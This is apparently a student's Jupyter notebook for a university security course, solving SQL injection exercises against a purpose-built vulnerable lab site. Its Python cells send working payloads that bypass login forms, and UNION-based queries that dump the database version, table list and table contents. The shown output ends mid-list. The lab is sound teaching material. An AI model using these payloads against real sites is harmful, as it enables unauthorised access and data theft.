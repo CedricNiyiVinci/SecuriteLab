{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ipl I317B Sécurité : labos\n",
    "## Semaine 3 : Vulnérabilitées web (1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1:\n",
    "Pour ce premier exercice, nous vous demandons de passer le formulaire de connexion codé par un mauvais développeur : http://labosecuipl.alwaysdata.net/22/s03/ex1/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<p id='result'>Good job, it's time to do the next exercice !</p></html>\n",
      "\n",
      "\n",
      "---\n",
      "\n",
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/22/s03/ex1/\",\n",
    "    data={\"login\": \"admin\", \"password\": '\" or 1=1;--'}  #TODO\n",
    ")\n",
    "print(page.text)\n",
    "\n",
    "print(\"\\n---\\n\")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "SELECT <?>... FROM <table>\n",
    "WHERE login = \"<input login>\"  AND password = \"<input password>\" "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 2a:\n",
    "Une variante du précédant formulaire a été mit en place, connectez-vous à nouveau à celui-ci : http://labosecuipl.alwaysdata.net/22/s03/ex2a/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<p id='result'>Good job, it's time to do the next exercice !</p></html>\n",
      "\n",
      "\n",
      "---\n",
      "\n",
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/22/s03/ex2a/\",\n",
    "    data={\"login\": \"admin\", \"password\":  \"'or 1=1;--\"}  #TODO\n",
    ")\n",
    "print(page.text)\n",
    "\n",
    "print(\"\\n---\\n\")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 2b:\n",
    "Une variante du précédant formulaire a été mit en place, connectez-vous à nouveau à celui-ci : http://labosecuipl.alwaysdata.net/22/s03/ex2b/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<p id='result'>Good job, it's time to do the next exercice !</p></html>\n",
      "\n",
      "\n",
      "---\n",
      "\n",
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/22/s03/ex2b/\",\n",
    "    data={\"login\": \"admin\", \"password\": \"'or 1=1);\"}  #TODO\n",
    "    #data={\"login\": \"admin\", \"password\": \"admin'or 1=1 or '\"}  #TODO\n",
    "\n",
    "    # SELECT ? FROM <table> WHERE (login='' AND password='' or 1 = 1 )\n",
    "    \n",
    ")\n",
    "print(page.text)\n",
    "\n",
    "print(\"\\n---\\n\")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 3:\n",
    "Dans cette nouvelle version, le développeur semble avoir prit conscience que certains caractères ne devraient pas être accepté ... mais vous êtes plus malin que lui, n'est-ce pas ?\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/22/s03/ex3/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<p id='result'>Good job, it's time to do the next exercice !</p></html>\n",
      "\n",
      "\n",
      "---\n",
      "\n",
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/22/s03/ex3/\",\n",
    "    data={\"login\": '\"or(true);--', \"password\": ''}  #TODO\n",
    "    #data={\"login\": \"admin\", \"password\": \"admin'or 1=1 or '\"}  #TODO\n",
    "\n",
    "    # SELECT ? FROM <table> WHERE (login='' AND password='' or 1 = 1 )\n",
    "    \n",
    ")\n",
    "print(page.text)\n",
    "\n",
    "print(\"\\n---\\n\")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 4:\n",
    "\n",
    "Une variante du précédant formulaire a été mit en place, encore une fois, trouvez le moyen de vous y connecter : http://labosecuipl.alwaysdata.net/22/s03/ex4/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<p id='result'>Good job, it's time to do the next exercice !</p></html>\n",
      "\n",
      "\n",
      "---\n",
      "\n",
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "from bs4 import BeautifulSoup \n",
    "\n",
    "session = requests.Session()\n",
    "\n",
    "page = session.get(\"http://labosecuipl.alwaysdata.net/22/s03/ex4/\")\n",
    "\n",
    "soup = BeautifulSoup(page.text)\n",
    "\n",
    "token = soup.find(\"input\",{\"name\":\"token\"})['value']\n",
    "\n",
    "page = session.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/22/s03/ex4/\",\n",
    "    data={\n",
    "        \"login\": \"admin\",\n",
    "        \"password\": \"'or(1);--\",\n",
    "        \"token\" : token\n",
    "        }  #TODO\n",
    "    #data={\"login\": \"admin\", \"password\": \"admin'or 1=1 or '\"}  #TODO\n",
    "\n",
    "    # SELECT ? FROM <table> WHERE (login='' AND password='' or 1 = 1 )\n",
    "    \n",
    ")\n",
    "print(page.text)\n",
    "\n",
    "print(\"\\n---\\n\")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 5:\n",
    "Un espion sur place m'a confirmé que, ne parvenant pas à circonvenir nos injections, le dévelopeur derrière ce site à juste décidé de vider la base de donnée `users`. Il s'est venté bruyament de sa nouvelle idée à coté de la machine à café :\n",
    "\n",
    "> \"J'ai vidé la base de donnée ! Haha ! La requête sql de connexion ne peut plus renvoyé de login utilisateur donc impossible pour eux de se connecter ! Haha, ces maudits hackers ne m'auront pas cette fois-ci !\".\n",
    "\n",
    "Désormait, toutes les requêtes, même injectée \"toujours vraie\" sont vide ... C'est embêtant mais je suis sûr qu'on peut arranger le coup !\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/22/s03/ex5/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<p id='result'>Good job, it's time to do the next exercice !</p></html>\n",
      "\n",
      "\n",
      "---\n",
      "\n",
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "#TODOimport requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/22/s03/ex5/\",\n",
    "    data={\"login\": \"'UNION SELECT 'a','b';--\", \"password\": ''}  #TODO\n",
    "    #data={\"login\": \"admin\", \"password\": \"admin'or 1=1 or '\"}  #TODO\n",
    "\n",
    "    # SELECT ? FROM <table> WHERE (login='' AND password='' or 1 = 1 )\n",
    "    \n",
    ")\n",
    "print(page.text)\n",
    "\n",
    "print(\"\\n---\\n\")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 6a:\n",
    "Pour ce nouvel exercice, nous allons utiliser un nouveau formulaire. Ce formulaire nous permet de chercher parmi les éléments du tableau périodique des éléments. Par exemple, si vous cherchez \"Co*\", vous obtiendrez les informations sur le copper (cuivre) et le cobalt.\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/22/s03/ex6/\n",
    "\n",
    "Commencez par récupérer le numéro de version de notre base de donnée. Ici, nous connaissons le type de base de donnée : SQLITE, un petit détour par la documentation nous permet deconnaître la fonction parfait pour cela : https://www.sqlite.org/lang_corefunc.html#sqlite_version."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "---\n",
      "\n",
      "[['3.27.2', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '']]\n"
     ]
    }
   ],
   "source": [
    "from unittest import result\n",
    "import requests\n",
    "\n",
    "\n",
    "def generate_inject(fields):\n",
    "    while len(fields) < 21:\n",
    "        fields.append(\" '' \")\n",
    "    injection = \"' UNION SELECT \" + \",\".join(fields) + \" ;--\"\n",
    "    page = requests.get(\n",
    "    \"http://labosecuipl.alwaysdata.net/22/s03/ex6/\",\n",
    "    params={\"name\": injection}  #TODO\n",
    "    #data={\"login\": \"admin\", \"password\": \"admin'or 1=1 or '\"}  #TODO\n",
    "    # SELECT ? FROM <table> WHERE (login='' AND password='' or 1 = 1 )\n",
    "    )\n",
    "    return page.text\n",
    "\n",
    "print(\"\\n---\\n\")\n",
    "\n",
    "def parse_result(page):\n",
    "    result = []\n",
    "    soup = BeautifulSoup(page)\n",
    "\n",
    "    for column in soup.find_all(\"tr\"):\n",
    "        current_line = []\n",
    "        for line in column.find_all(\"td\"):\n",
    "            current_line.append(line.text)\n",
    "        if current_line:\n",
    "            result.append(current_line)\n",
    "    return result\n",
    "\n",
    "print(parse_result(generate_inject([\"sqlite_version()\"])))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 6b:\n",
    "Dans le même ordre d’idée, je vous invite à récupérer la liste des tables présentes dans cette base de donnée. Comme souvent, la lecture de la documentation peut vous faciliter la vie : https://www.sqlite.org/faq.html#q7"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "---\n",
      "\n",
      "[['elements', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['gemstones', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['planets', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '']]\n"
     ]
    }
   ],
   "source": [
    "from unittest import result\n",
    "import requests\n",
    "\n",
    "\n",
    "def generate_inject(fields):\n",
    "    while len(fields) < 21:\n",
    "        fields.append(\" '' \")\n",
    "    injection = \"' UNION SELECT \" + \",\".join(fields) + \" FROM sqlite_master where type='table';--\"\n",
    "    page = requests.get(\n",
    "    \"http://labosecuipl.alwaysdata.net/22/s03/ex6/\",\n",
    "    params={\"name\": injection}  #TODO\n",
    "    #data={\"login\": \"admin\", \"password\": \"admin'or 1=1 or '\"}  #TODO\n",
    "    # SELECT ? FROM <table> WHERE (login='' AND password='' or 1 = 1 )\n",
    "    )\n",
    "    return page.text\n",
    "\n",
    "print(\"\\n---\\n\")\n",
    "\n",
    "def parse_result(page):\n",
    "    result = []\n",
    "    soup = BeautifulSoup(page)\n",
    "\n",
    "    for column in soup.find_all(\"tr\"):\n",
    "        current_line = []\n",
    "        for line in column.find_all(\"td\"):\n",
    "            current_line.append(line.text)\n",
    "        if current_line:\n",
    "            result.append(current_line)\n",
    "    return result\n",
    "\n",
    "print(parse_result(generate_inject([\"name\"])))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 6c:\n",
    "Maintenant que vous connaissez toutes les tables dans cette base de données ainsi que le nom de chaque champ, pourquoi ne pas récupérer le contenu de chacune de ces tables ?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[['Achroite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Actinolite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Adamite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Afghanite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Agate', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Ajoite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Albite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Alexandrite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Allanite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Amazonite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Amber', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Amblygonite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Amethyst', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Ametrine', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Ammolite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Anatase', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Andalusite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Andesine', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Apatite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Apophyllite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Aquamarine', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Axinite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Azurite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Bastnasite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Benitoite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Beryl', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Bixbite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Bloodstone', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Brazillianite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Calcareous Concretions', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Calcite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Carnelian', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Cassiterite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Chalcedony', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Charoite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Chlorastrolite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Chrysoberyl', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Chrysocolla', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Chrysoprase', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Citrine', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Copal', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Coral', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Corundum', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Cuprite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Danburite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Datolite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Demantoid', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Diamond', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Diopside', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Dioptase', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Ekanite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Emerald', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Enstatite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Epidote', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Euclase', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Eudialyte', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Feldspar', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Fluorite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Gahnospinel', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Garnet', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Glass', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Hackmanite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Heliodor', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Hematite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Hemimorphite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Horn', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Howlite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Idocrase', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Iolite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Ivory', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Jadeite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Jasper', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Jet', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Kunzite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Labradorite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Lapis Lazuli', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Lazulite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Malachite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Marcasite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Maw Sit Sit', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Moldavite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Moonstone', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Morganite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Nephrite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Onyx', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Opal', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Pearl', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Peridot', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Petalite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Phenakite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Phosphophyllite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Prosopite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Pyrite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Quartz', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Rhodochrosite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Rhodolite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Rhodonite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Ruby', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Sapphire', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Saussurite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Scapolite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Scheelite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Serpentine', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Sillimanite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Sinhalite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Smithsonite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Smoky Quartz', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Sodalite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Sphalerite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Sphene', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Spinel', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Spodumene', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Sugilite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Taaffeite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Tanzanite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Thomsonite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Tiger-eye', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Topaz', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Tourmaline', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Tsavorite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Tugtupite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Turquoise', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Unakite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Uvarovite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Variscite', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Zircon', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '']]\n",
      "-------\n",
      "[['Earth', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Jupiter', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Mars', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Mercury', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Neptune', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Saturn', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['The Sun', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Uranus', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Venus', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '']]\n",
      "-------\n",
      "[['Actinium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Aluminum', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Americium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Antimony', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Argon', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Arsenic', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Astatine', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Barium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Berkelium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Beryllium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Bismuth', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Bohrium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Boron', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Bromine', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Cadmium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Calcium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Californium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Carbon', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Cerium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Cesium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Chlorine', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Chromium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Cobalt', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Copper', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Curium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Dubnium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Dysprosium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Einsteinium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Erbium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Europium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Fermium', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Fluorine', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''], ['Francium', '', '', '', '', '', 